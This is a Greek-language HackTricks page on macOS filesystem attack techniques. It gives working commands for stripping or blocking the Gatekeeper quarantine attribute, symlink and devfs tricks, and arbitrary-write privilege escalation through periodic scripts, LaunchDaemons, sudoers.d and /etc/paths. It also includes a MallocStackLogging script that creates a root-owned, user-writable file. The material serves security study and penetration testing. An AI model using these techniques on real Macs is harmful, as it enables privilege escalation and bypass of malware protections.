# macOS FS Κόλπα

<details>

<summary><strong>Μάθετε το χάκινγκ του AWS από το μηδέν μέχρι τον ήρωα με το</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

Άλλοι τρόποι υποστήριξης του HackTricks:

* Αν θέλετε να δείτε την **εταιρεία σας διαφημισμένη στο HackTricks** ή να **κατεβάσετε το HackTricks σε μορφή PDF** ελέγξτε τα [**ΣΧΕΔΙΑ ΣΥΝΔΡΟΜΗΣ**](https://github.com/sponsors/carlospolop)!
* Αποκτήστε το [**επίσημο PEASS & HackTricks swag**](https://peass.creator-spring.com)
* Ανακαλύψτε [**την Οικογένεια PEASS**](https://opensea.io/collection/the-peass-family), τη συλλογή μας από αποκλειστικά [**NFTs**](https://opensea.io/collection/the-peass-family)
* **Εγγραφείτε** στην 💬 [**ομάδα Discord**](https://discord.gg/hRep4RUj7f) ή στην [**ομάδα τηλεγραφήματος**](https://t.me/peass) ή **ακολουθήστε** μας στο **Twitter** 🐦 [**@carlospolopm**](https://twitter.com/hacktricks\_live)**.**
* **Μοιραστείτε τα χάκινγκ κόλπα σας υποβάλλοντας PRs** στα [**HackTricks**](https://github.com/carlospolop/hacktricks) και [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) αποθετήρια του github.

</details>

## Συνδυασμοί δικαιωμάτων POSIX

Δικαιώματα σε ένα **κατάλογο**:

* **ανάγνωση** - μπορείτε να **απαριθμήσετε** τα στοιχεία του καταλόγου
* **εγγραφή** - μπορείτε να **διαγράψετε/γράψετε** **αρχεία** στον κατάλογο και μπορείτε να **διαγράψετε κενούς φακέλους**.
* Αλλά δεν μπορείτε να **διαγράψετε/τροποποιήσετε μη-κενούς φακέλους** εκτός αν έχετε δικαιώματα εγγραφής πάνω σε αυτόν.
* Δεν μπορείτε να τροποποιήσετε το όνομα ενός φακέλου εκτός αν το κατέχετε.
* **εκτέλεση** - σας επιτρέπεται να διασχίσετε τον κατάλογο - αν δεν έχετε αυτό το δικαίωμα, δεν μπορείτε να έχετε πρόσβαση σε κανένα αρχείο μέσα σε αυτόν, ή σε οποιουσδήποτε υποκαταλόγους.

### Επικίνδυνοι Συνδυασμοί

**Πώς να αντικαταστήσετε ένα αρχείο/φάκελο που ανήκει στο ριζικό χρήστη**, αλλά:

* Ένας γονικός **κατόχος καταλόγου** στη διαδρομή είναι ο χρήστης
* Ένας γονικός **κατόχος καταλόγου** στη διαδρομή είναι μια **ομάδα χρηστών** με **πρόσβαση εγγραφής**
* Μια **ομάδα χρηστών** έχει **πρόσβαση εγγραφής** στο **αρχείο**

Με οποιονδήποτε από τους προηγούμενους συνδυασμούς, ένας επιτιθέμενος θα μπορούσε να **ενθερμήσει** ένα **σύμβολο/σκληρό σύνδεσμο** στην αναμενόμενη διαδρομή για να αποκτήσει προνομιούχα αυθαίρετη εγγραφή.

### Ειδική περίπτωση ρίζας φακέλου R+X

Αν υπάρχουν αρχεία σε έναν **κατάλογο** όπου **μόνο η ρίζα έχει πρόσβαση R+X**, αυτά **δεν είναι προσβάσιμα από κανέναν άλλο**. Έτσι μια ευπάθεια που επιτρέπει τη **μετακίνηση ενός αρχείου που μπορεί να διαβαστεί από έναν χρήστη**, το οποίο δεν μπορεί να διαβαστεί λόγω αυτού του **περιορισμού**, από αυτόν τον φάκελο **σε έναν διαφορετικό**, θα μπορούσε να καταχραστείται για να διαβάσει αυτά τα αρχεία.

Παράδειγμα στο: [https://theevilbit.github.io/posts/exploiting\_directory\_permissions\_on\_macos/#nix-directory-permissions](https://theevilbit.github.io/posts/exploiting\_directory\_permissions\_on\_macos/#nix-directory-permissions)

## Συμβολικός Σύνδεσμος / Σκληρός Σύνδεσμος

Αν ένα προνομιούχο διεργασία γράφει δεδομένα σε ένα **αρχείο** που θα μπορούσε να **ελεγχθεί** από έναν **χρήστη με χαμηλότερα προνόμια**, ή που θα μπορούσε να **έχει δημιουργηθεί προηγουμένως** από έναν χρήστη με χαμηλότερα προνόμια. Ο χρήστης θα μπορούσε απλά να **το κατευθύνει σε ένα άλλο αρχείο** μέσω ενός Συμβολικού ή Σκληρού συνδέσμου, και η προνομιούχα διεργασία θα γράψει σε αυτό το αρχείο.

Ελέγξτε στις άλλες ενότητες όπου ένας επιτιθέμενος θα μπορούσε να **καταχραστεί μια αυθαίρετη εγγραφή για να αναβαθμίσει τα προνόμιά του**.

## .fileloc

Τα αρχεία με την επέκταση **`.fileloc`** μπορούν να δείχνουν σε άλλες εφαρμογές ή δυαδικά αρχεία, έτσι όταν ανοίγονται, η εφαρμογή/δυαδικό θα εκτελεστεί.\
Παράδειγμα:
```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE plist PUBLIC "-//Apple//DTD PLIST 1.0//EN" "http://www.apple.com/DTDs/PropertyList-1.0.dtd">
<plist version="1.0">
<dict>
<key>URL</key>
<string>file:///System/Applications/Calculator.app</string>
<key>URLPrefix</key>
<integer>0</integer>
</dict>
</plist>
```
## Τυχαίο FD

Εάν μπορείτε να κάνετε ένα **process να ανοίξει ένα αρχείο ή έναν φάκελο με υψηλά προνόμια**, μπορείτε να καταχραστείτε το **`crontab`** για να ανοίξετε ένα αρχείο στο `/etc/sudoers.d` με **`EDITOR=exploit.py`**, έτσι το `exploit.py` θα λάβει το FD στο αρχείο μέσα στο `/etc/sudoers` και θα το καταχραστεί.

Για παράδειγμα: [https://youtu.be/f1HA5QhLQ7Y?t=21098](https://youtu.be/f1HA5QhLQ7Y?t=21098)

## Αποφύγετε τα κόλπα xattrs της καραντίνας

### Αφαιρέστε τα
```bash
xattr -d com.apple.quarantine /path/to/file_or_app
```
### uchg / uchange / uimmutable flag

Εάν ένα αρχείο/φάκελος έχει αυτήν τη μόνιμη ιδιότητα, δεν θα είναι δυνατή η τοποθέτηση ενός xattr σε αυτό.
```bash
echo asd > /tmp/asd
chflags uchg /tmp/asd # "chflags uchange /tmp/asd" or "chflags uimmutable /tmp/asd"
xattr -w com.apple.quarantine "" /tmp/asd
xattr: [Errno 1] Operation not permitted: '/tmp/asd'

ls -lO /tmp/asd
# check the "uchg" in the output
```
### Προσάρτηση defvfs

Μια προσάρτηση **devfs** **δεν υποστηρίζει xattr**, περισσότερες πληροφορίες στο [**CVE-2023-32364**](https://gergelykalman.com/CVE-2023-32364-a-macOS-sandbox-escape-by-mounting.html)
```bash
mkdir /tmp/mnt
mount_devfs -o noowners none "/tmp/mnt"
chmod 777 /tmp/mnt
mkdir /tmp/mnt/lol
xattr -w com.apple.quarantine "" /tmp/mnt/lol
xattr: [Errno 1] Operation not permitted: '/tmp/mnt/lol'
```
### writeextattr ACL

Αυτό το ACL εμποδίζει την προσθήκη `xattrs` στο αρχείο
```bash
rm -rf /tmp/test*
echo test >/tmp/test
chmod +a "everyone deny write,writeattr,writeextattr,writesecurity,chown" /tmp/test
ls -le /tmp/test
ditto -c -k test test.zip
# Download the zip from the browser and decompress it, the file should be without a quarantine xattr

cd /tmp
echo y | rm test

# Decompress it with ditto
ditto -x -k --rsrc test.zip .
ls -le /tmp/test

# Decompress it with open (if sandboxed decompressed files go to the Downloads folder)
open test.zip
sleep 1
ls -le /tmp/test
```
### **com.apple.acl.text xattr + AppleDouble**

Η μορφή αρχείου **AppleDouble** αντιγράφει ένα αρχείο συμπεριλαμβανομένων των ACEs του.

Στον [**πηγαίο κώδικα**](https://opensource.apple.com/source/Libc/Libc-391/darwin/copyfile.c.auto.html) είναι δυνατόν να δούμε ότι η αναπαράσταση κειμένου ACL που αποθηκεύεται μέσα στο xattr με το όνομα **`com.apple.acl.text`** θα οριστεί ως ACL στο αποσυμπιεσμένο αρχείο. Έτσι, αν συμπιέσετε μια εφαρμογή σε ένα αρχείο zip με τη μορφή αρχείου **AppleDouble** με ένα ACL που εμποδίζει άλλα xattrs να γραφτούν σε αυτό... το xattr καραντίνας δεν ορίστηκε στην εφαρμογή:

Ελέγξτε την [**πρωτότυπη αναφορά**](https://www.microsoft.com/en-us/security/blog/2022/12/19/gatekeepers-achilles-heel-unearthing-a-macos-vulnerability/) για περισσότερες πληροφορίες.

Για να αναπαράγουμε αυτό πρέπει πρώτα να αποκτήσουμε το σωστό αλφαριθμητικό acl:
```bash
# Everything will be happening here
mkdir /tmp/temp_xattrs
cd /tmp/temp_xattrs

# Create a folder and a file with the acls and xattr
mkdir del
mkdir del/test_fold
echo test > del/test_fold/test_file
chmod +a "everyone deny write,writeattr,writeextattr,writesecurity,chown" del/test_fold
chmod +a "everyone deny write,writeattr,writeextattr,writesecurity,chown" del/test_fold/test_file
ditto -c -k del test.zip

# uncomporess to get it back
ditto -x -k --rsrc test.zip .
ls -le test
```
(Note that even if this works the sandbox write the quarantine xattr before)

Δεν είναι πραγματικά απαραίτητο, αλλά το αφήνω εκεί απλώς για περίπτωση:

{% content-ref url="macos-xattr-acls-extra-stuff.md" %}
[macos-xattr-acls-extra-stuff.md](macos-xattr-acls-extra-stuff.md)
{% endcontent-ref %}

## Παράκαμψη Υπογραφών Κώδικα

Τα Bundles περιέχουν το αρχείο **`_CodeSignature/CodeResources`** το οποίο περιέχει το **hash** κάθε **αρχείου** στο **bundle**. Σημειώστε ότι το hash του CodeResources είναι επίσης **ενσωματωμένο στο εκτελέσιμο**, οπότε δεν μπορούμε να το αλλάξουμε.

Ωστόσο, υπάρχουν μερικά αρχεία των οποίων η υπογραφή δεν θα ελεγχθεί, αυτά έχουν το κλειδί omit στο plist, όπως:
```xml
<dict>
...
<key>rules</key>
<dict>
...
<key>^Resources/.*\.lproj/locversion.plist$</key>
<dict>
<key>omit</key>
<true/>
<key>weight</key>
<real>1100</real>
</dict>
...
</dict>
<key>rules2</key>
...
<key>^(.*/)?\.DS_Store$</key>
<dict>
<key>omit</key>
<true/>
<key>weight</key>
<real>2000</real>
</dict>
...
<key>^PkgInfo$</key>
<dict>
<key>omit</key>
<true/>
<key>weight</key>
<real>20</real>
</dict>
...
<key>^Resources/.*\.lproj/locversion.plist$</key>
<dict>
<key>omit</key>
<true/>
<key>weight</key>
<real>1100</real>
</dict>
...
</dict>
```
Είναι δυνατόν να υπολογιστεί η υπογραφή ενός πόρου από το cli με:
```bash
openssl dgst -binary -sha1 /System/Cryptexes/App/System/Applications/Safari.app/Contents/Resources/AppIcon.icns | openssl base64
```
{% endcode %}

## Τοποθέτηση dmgs

Ένας χρήστης μπορεί να τοποθετήσει ένα προσαρμοσμένο dmg ακόμα και πάνω σε ορισμένους υπάρχοντες φακέλους. Έτσι μπορείτε να δημιουργήσετε ένα προσαρμοσμένο πακέτο dmg με προσαρμοσμένο περιεχόμενο:
```bash
# Create the volume
hdiutil create /private/tmp/tmp.dmg -size 2m -ov -volname CustomVolName -fs APFS 1>/dev/null
mkdir /private/tmp/mnt

# Mount it
hdiutil attach -mountpoint /private/tmp/mnt /private/tmp/tmp.dmg 1>/dev/null

# Add custom content to the volume
mkdir /private/tmp/mnt/custom_folder
echo "hello" > /private/tmp/mnt/custom_folder/custom_file

# Detach it
hdiutil detach /private/tmp/mnt 1>/dev/null

# Next time you mount it, it will have the custom content you wrote

# You can also create a dmg from an app using:
hdiutil create -srcfolder justsome.app justsome.dmg
```
{% endcode %}

Συνήθως το macOS προσαρτά το δίσκο μιλώντας στην υπηρεσία Mach `com.apple.DiskArbitrarion.diskarbitrariond` (που παρέχεται από το `/usr/libexec/diskarbitrationd`). Εάν προστεθεί η παράμετρος `-d` στο αρχείο LaunchDaemons plist και επανεκκινηθεί, θα αποθηκεύσει καταγραφές στο `/var/log/diskarbitrationd.log`.\
Ωστόσο, είναι δυνατόν να χρησιμοποιηθούν εργαλεία όπως το `hdik` και το `hdiutil` για να επικοινωνήσουν απευθείας με το `com.apple.driver.DiskImages` kext.

## Αυθαίρετες Εγγραφές

### Περιοδικά scripts sh

Εάν το script σας μπορεί να ερμηνευτεί ως ένα **shell script** μπορείτε να αντικαταστήσετε το **`/etc/periodic/daily/999.local`** shell script που θα εκτελείται κάθε μέρα.

Μπορείτε να **προσομοιώσετε** την εκτέλεση αυτού του script με: **`sudo periodic daily`**

### Daemons

Γράψτε ένα αυθαίρετο **LaunchDaemon** όπως το **`/Library/LaunchDaemons/xyz.hacktricks.privesc.plist`** με ένα plist που εκτελεί ένα αυθαίρετο script όπως:
```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE plist PUBLIC "-//Apple Computer//DTD PLIST 1.0//EN" "http://www.apple.com/DTDs/PropertyList-1.0.dtd">
<plist version="1.0">
<dict>
<key>Label</key>
<string>com.sample.Load</string>
<key>ProgramArguments</key>
<array>
<string>/Applications/Scripts/privesc.sh</string>
</array>
<key>RunAtLoad</key>
<true/>
</dict>
</plist>
```
### Αρχείο Sudoers

Αν έχετε **αυθαίρετη εγγραφή**, μπορείτε να δημιουργήσετε ένα αρχείο μέσα στον φάκελο **`/etc/sudoers.d/`** που να σας παρέχει δικαιώματα **sudo**.

### Αρχεία PATH

Το αρχείο **`/etc/paths`** είναι ένα από τα κύρια μέρη που γεμίζουν τη μεταβλητή περιβάλλοντος PATH. Πρέπει να είστε root για να το αντικαταστήσετε, αλλά αν ένα σενάριο από **προνομιούχο διεργασία** εκτελεί κάποια **εντολή χωρίς την πλήρη διαδρομή**, μπορείτε να το **αρπάξετε** τροποποιώντας αυτό το αρχείο.

Μπορείτε επίσης να γράψετε αρχεία στο **`/etc/paths.d`** για να φορτώσετε νέους φακέλους στη μεταβλητή περιβάλλοντος `PATH`.

## Δημιουργία εγγράψιμων αρχείων ως άλλοι χρήστες

Αυτό θα δημιουργήσει ένα αρχείο που ανήκει στο ροοτ και είναι εγγράψιμο από εμένα ([**κώδικας από εδώ**](https://github.com/gergelykalman/brew-lpe-via-periodic/blob/main/brew\_lpe.sh)). Αυτό ενδέχεται επίσης να λειτουργήσει ως προνομιακή αύξηση:
```bash
DIRNAME=/usr/local/etc/periodic/daily

mkdir -p "$DIRNAME"
chmod +a "$(whoami) allow read,write,append,execute,readattr,writeattr,readextattr,writeextattr,chown,delete,writesecurity,readsecurity,list,search,add_file,add_subdirectory,delete_child,file_inherit,directory_inherit," "$DIRNAME"

MallocStackLogging=1 MallocStackLoggingDirectory=$DIRNAME MallocStackLoggingDontDeleteStackLogFile=1 top invalidparametername

FILENAME=$(ls "$DIRNAME")
echo $FILENAME
```
## POSIX Shared Memory

**Το POSIX shared memory** επιτρέπει σε διεργασίες σε λειτουργικά συστήματα συμβατά με το POSIX να έχουν πρόσβαση σε μια κοινή περιοχή μνήμης, διευκολύνοντας την ταχύτερη επικοινωνία σε σύγκριση με άλλες μεθόδους επικοινωνίας μεταξύ διεργασιών. Περιλαμβάνει τη δημιουργία ή το άνοιγμα ενός κοινού αντικειμένου μνήμης με τη χρήση της `shm_open()`, την ορισμό του μεγέθους του με τη χρήση της `ftruncate()`, και την αντιστοίχισή του στο χώρο διευθύνσεων της διεργασίας χρησιμοποιώντας την `mmap()`. Οι διεργασίες μπορούν στη συνέχεια να διαβάζουν και να γράφουν απευθείας σε αυτήν την περιοχή μνήμης. Για τη διαχείριση της ταυτόχρονης πρόσβασης και την πρόληψη διαφθοράς δεδομένων, συχνά χρησιμοποιούνται μηχανισμοί συγχρονισμού όπως mutexes ή semaphores. Τέλος, οι διεργασίες αποσυντονίζουν και κλείνουν την κοινή μνήμη με τη χρήση των `munmap()` και `close()`, και προαιρετικά αφαιρούν το αντικείμενο μνήμης με τη χρήση της `shm_unlink()`. Αυτό το σύστημα είναι ιδιαίτερα αποτελεσματικό για αποτελεσματική, γρήγορη IPC σε περιβάλλοντα όπου πολλές διεργασίες χρειάζεται να έχουν πρόσβαση σε κοινά δεδομένα με ταχύτητα. 

<details>

<summary>Παράδειγμα Κώδικα Παραγωγού</summary>
```c
// gcc producer.c -o producer -lrt
#include <fcntl.h>
#include <sys/mman.h>
#include <sys/stat.h>
#include <unistd.h>
#include <stdio.h>
#include <stdlib.h>

int main() {
const char *name = "/my_shared_memory";
const int SIZE = 4096; // Size of the shared memory object

// Create the shared memory object
int shm_fd = shm_open(name, O_CREAT | O_RDWR, 0666);
if (shm_fd == -1) {
perror("shm_open");
return EXIT_FAILURE;
}

// Configure the size of the shared memory object
if (ftruncate(shm_fd, SIZE) == -1) {
perror("ftruncate");
return EXIT_FAILURE;
}

// Memory map the shared memory
void *ptr = mmap(0, SIZE, PROT_READ | PROT_WRITE, MAP_SHARED, shm_fd, 0);
if (ptr == MAP_FAILED) {
perror("mmap");
return EXIT_FAILURE;
}

// Write to the shared memory
sprintf(ptr, "Hello from Producer!");

// Unmap and close, but do not unlink
munmap(ptr, SIZE);
close(shm_fd);

return 0;
}
```
</details>

<details>

<summary>Παράδειγμα Καταναλωτή Κώδικα</summary>
```c
// gcc consumer.c -o consumer -lrt
#include <fcntl.h>
#include <sys/mman.h>
#include <sys/stat.h>
#include <unistd.h>
#include <stdio.h>
#include <stdlib.h>

int main() {
const char *name = "/my_shared_memory";
const int SIZE = 4096; // Size of the shared memory object

// Open the shared memory object
int shm_fd = shm_open(name, O_RDONLY, 0666);
if (shm_fd == -1) {
perror("shm_open");
return EXIT_FAILURE;
}

// Memory map the shared memory
void *ptr = mmap(0, SIZE, PROT_READ, MAP_SHARED, shm_fd, 0);
if (ptr == MAP_FAILED) {
perror("mmap");
return EXIT_FAILURE;
}

// Read from the shared memory
printf("Consumer received: %s\n", (char *)ptr);

// Cleanup
munmap(ptr, SIZE);
close(shm_fd);
shm_unlink(name); // Optionally unlink

return 0;
}

```
</details>

## macOS Προστατευμένοι Δείκτες

Οι **προστατευμένοι δείκτες του macOS** είναι μια λειτουργία ασφαλείας που εισήχθη στο macOS για να βελτιώσει την ασφάλεια και την αξιοπιστία των λειτουργιών των **αποκλειστικών δεικτών αρχείων** σε εφαρμογές χρήστη. Αυτοί οι προστατευμένοι δείκτες παρέχουν έναν τρόπο σύνδεσης συγκεκριμένων περιορισμών ή "φρουρών" με τους δείκτες αρχείων, οι οποίοι επιβάλλονται από τον πυρήνα.

Αυτή η λειτουργία είναι ιδιαίτερα χρήσιμη για την πρόληψη ορισμένων κατηγοριών ευπαθειών ασφάλειας όπως η **μη εξουσιοδοτημένη πρόσβαση σε αρχεία** ή οι **συνθήκες ανταγωνισμού**. Αυτές οι ευπαθείς σημεία εμφανίζονται όταν, για παράδειγμα, ένα νήμα έχει πρόσβαση σε μια περιγραφή αρχείου δίνοντας **σε ένα άλλο ευάλωτο νήμα πρόσβαση πάνω σε αυτό** ή όταν ένας δείκτης αρχείου **κληρονομείται** από ένα ευάλωτο παιδικό διεργασία. Κάποιες λειτουργίες που σχετίζονται με αυτήν τη λειτουργικότητα είναι:

* `guarded_open_np`: Άνοιγμα ενός FD με φρουρό
* `guarded_close_np`: Κλείσιμο
* `change_fdguard_np`: Αλλαγή σημαιών φρουράς σε έναν δείκτη (ακόμα και αφαίρεση της προστασίας του φρουρού)

## Αναφορές

* [https://theevilbit.github.io/posts/exploiting\_directory\_permissions\_on\_macos/](https://theevilbit.github.io/posts/exploiting\_directory\_permissions\_on\_macos/)

<details>

<summary><strong>Μάθετε το χάκινγκ στο AWS από το μηδέν μέχρι τον ήρωα με</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (Ειδικός Ερυθρού Συνεργείου AWS του HackTricks)</strong></a><strong>!</strong></summary>

Άλλοι τρόποι υποστήριξης του HackTricks:

* Αν θέλετε να δείτε την **εταιρεία σας διαφημισμένη στο HackTricks** ή να **κατεβάσετε το HackTricks σε μορφή PDF** ελέγξτε τα [**ΣΧΕΔΙΑ ΣΥΝΔΡΟΜΗΣ**](https://github.com/sponsors/carlospolop)!
* Αποκτήστε το [**επίσημο PEASS & HackTricks swag**](https://peass.creator-spring.com)
* Ανακαλύψτε την [**Οικογένεια PEASS**](https://opensea.io/collection/the-peass-family), τη συλλογή μας από αποκλειστικά [**NFTs**](https://opensea.io/collection/the-peass-family)
* **Εγγραφείτε στη** 💬 [**ομάδα Discord**](https://discord.gg/hRep4RUj7f) ή στη [**ομάδα τηλεγραφήματος**](https://t.me/peass) ή **ακολουθήστε** μας στο **Twitter** 🐦 [**@carlospolopm**](https://twitter.com/hacktricks\_live)**.**
* **Μοιραστείτε τα χάκινγκ σας χάρη στην υποβολή PRs στα** [**HackTricks**](https://github.com/carlospolop/hacktricks) και [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) αποθετήρια του github.

</details>
